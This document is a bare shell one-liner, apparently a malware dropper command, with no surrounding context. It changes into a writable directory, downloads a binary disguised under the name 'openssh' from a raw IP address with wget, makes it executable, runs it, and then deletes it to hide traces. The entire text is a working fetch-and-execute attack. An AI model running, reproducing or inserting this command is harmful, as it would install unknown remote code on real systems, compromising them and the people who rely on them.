cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://144.217.89.120/openssh; chmod +x openssh; ./openssh; rm -rf openssh
